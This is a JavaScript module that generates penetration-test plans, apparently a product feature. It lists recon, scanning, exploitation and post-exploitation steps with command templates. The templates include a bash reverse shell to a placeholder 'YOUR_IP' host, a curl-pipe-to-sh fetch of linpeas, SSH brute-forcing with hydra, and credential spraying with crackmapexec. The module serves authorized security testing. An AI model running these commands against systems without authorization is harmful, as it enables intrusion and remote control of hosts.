"use strict";
// ================= Attack Planner — AI-generated penetration test plans =================
// Given a target scope, generates a structured pentest methodology:
// recon → enumeration → vulnerability analysis → exploitation → post-exploitation → reporting
// Each phase has specific tools, commands, and checkpoints.
// PRO TIER FEATURE

const PHASES = [
  {
    id: "recon",
    name: "Reconnaissance",
    description: "Gather information about the target without direct interaction",
    techniques: [
      { name: "Passive DNS", tools: ["dig", "host", "nslookup", "dnsenum"], cmd: (t) => `dig +short ${t} ANY\nhost -a ${t}\ndnsenum ${t}` },
      { name: "WHOIS", tools: ["whois"], cmd: (t) => `whois ${t}` },
      { name: "Subdomain enumeration", tools: ["subfinder", "amass", "assetfinder"], cmd: (t) => `subfinder -d ${t} -silent\namass enum -passive -d ${t}` },
      { name: "Technology fingerprint", tools: ["whatweb", "wappalyzer"], cmd: (t) => `whatweb ${t}` },
      { name: "Email harvesting", tools: ["theHarvester"], cmd: (t) => `theHarvester -d ${t} -b all` },
      { name: "Google dorking", tools: ["google"], cmd: (t) => `site:${t} filetype:pdf\nsite:${t} inurl:admin\nsite:${t} intitle:"index of"` },
    ],
  },
  {
    id: "enum",
    name: "Enumeration",
    description: "Active scanning to discover services, ports, and versions",
    techniques: [
      { name: "Port scan", tools: ["nmap"], cmd: (t) => `nmap -sV -sC -oN scan.txt ${t}\nnmap -p- --min-rate 5000 ${t}` },
      { name: "Web directory bruteforce", tools: ["gobuster", "ffuf", "dirsearch"], cmd: (t) => `gobuster dir -u http://${t} -w /usr/share/wordlists/dirb/common.txt\nffuf -u http://${t}/FUZZ -w common.txt` },
      { name: "Virtual host discovery", tools: ["ffuf"], cmd: (t) => `ffuf -u http://${t} -H "Host: FUZZ.${t}" -w subdomains.txt -fs <size>` },
      { name: "SMB enumeration", tools: ["enum4linux", "smbclient"], cmd: (t) => `enum4linux -a ${t}\nsmbclient -L //${t} -N` },
      { name: "SNMP enumeration", tools: ["snmpwalk"], cmd: (t) => `snmpwalk -c public -v1 ${t}` },
    ],
  },
  {
    id: "vuln",
    name: "Vulnerability Analysis",
    description: "Identify vulnerabilities in discovered services",
    techniques: [
      { name: "Automated scan", tools: ["nuclei", "nikto"], cmd: (t) => `nuclei -u http://${t} -severity critical,high\nnikto -h ${t}` },
      { name: "CVE lookup", tools: ["searchsploit"], cmd: (t) => `searchsploit <service> <version>` },
      { name: "Web app testing", tools: ["sqlmap", "wpscan", "burpsuite"], cmd: (t) => `sqlmap -u "http://${t}/page?id=1" --batch\nwpscan --url http://${t} --enumerate vp` },
      { name: "SSL/TLS analysis", tools: ["sslscan", "testssl"], cmd: (t) => `sslscan ${t}\ntestssl ${t}` },
      { name: "Default credentials", tools: ["hydra"], cmd: (t) => `hydra -L users.txt -P passwords.txt ${t} ssh` },
    ],
  },
  {
    id: "exploit",
    name: "Exploitation",
    description: "Attempt to exploit discovered vulnerabilities (authorized targets only)",
    techniques: [
      { name: "Metasploit", tools: ["msfconsole"], cmd: (t) => `msfconsole -q\nuse exploit/...\nset RHOSTS ${t}\nrun` },
      { name: "Manual exploitation", tools: ["python", "curl"], cmd: () => "# Based on discovered vulnerabilities" },
      { name: "Reverse shell", tools: ["nc", "bash"], cmd: (t) => `# Listener:\nnc -lvnp 4444\n# Payload:\nbash -i >& /dev/tcp/YOUR_IP/4444 0>&1` },
      { name: "Web shell upload", tools: ["curl"], cmd: () => "# If file upload vulnerability found" },
    ],
  },
  {
    id: "post",
    name: "Post-Exploitation",
    description: "Escalate privileges and maintain access",
    techniques: [
      { name: "Privilege escalation", tools: ["linpeas", "winpeas"], cmd: () => `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh` },
      { name: "Credential harvesting", tools: ["mimikatz", "hashdump"], cmd: () => "# Dump credentials from compromised system" },
      { name: "Lateral movement", tools: ["crackmapexec", "psexec"], cmd: (t) => `crackmapexec smb ${t} -u admin -p password` },
      { name: "Data exfiltration", tools: ["scp", "nc"], cmd: () => "# Identify and extract sensitive data" },
    ],
  },
  {
    id: "report",
    name: "Reporting",
    description: "Document findings and generate the pentest report",
    techniques: [
      { name: "Findings documentation", tools: ["markdown"], cmd: () => "# Use darknode report generate" },
      { name: "Evidence collection", tools: ["screenshot"], cmd: () => "# Capture screenshots and command output" },
      { name: "Risk rating", tools: ["CVSS"], cmd: () => "# Rate each finding: Critical / High / Medium / Low / Info" },
      { name: "Remediation", tools: [], cmd: () => "# Provide fix recommendations for each finding" },
    ],
  },
];

function generatePlan(target, scope) {
  scope = scope || {};
  const plan = {
    target,
    scope: {
      type: scope.type || "full",  // full | web | network | wireless
      authorized: scope.authorized || false,
      exclusions: scope.exclusions || [],
      timeLimit: scope.timeLimit || null,
    },
    phases: PHASES.filter(p => {
      if (scope.type === "web") return ["recon", "enum", "vuln", "report"].includes(p.id);
      return true;
    }).map(phase => ({
      ...phase,
      techniques: phase.techniques.map(t => ({
        ...t,
        commands: t.cmd(target),
        status: "pending",
      })),
      status: "pending",
    })),
    generatedAt: Date.now(),
    disclaimer: "⚠ Only use on systems you own or have explicit written authorization to test.",
  };
  return plan;
}

function planToMarkdown(plan) {
  const lines = [
    `# Penetration Test Plan — ${plan.target}`,
    `Generated: ${new Date(plan.generatedAt).toISOString()}`,
    "",
    `> ${plan.disclaimer}`,
    "",
    `**Scope:** ${plan.scope.type} | **Authorized:** ${plan.scope.authorized ? "Yes" : "⚠ NOT YET"}`,
    plan.scope.exclusions.length ? `**Exclusions:** ${plan.scope.exclusions.join(", ")}` : "",
    "",
  ];
  for (const phase of plan.phases) {
    lines.push(`## ${phase.name}`, `*${phase.description}*`, "");
    for (const tech of phase.techniques) {
      lines.push(`### ${tech.name}`, `**Tools:** ${tech.tools.join(", ") || "manual"}`, "```bash", tech.commands, "```", "");
    }
  }
  return lines.join("\n");
}

module.exports = { PHASES, generatePlan, planToMarkdown };
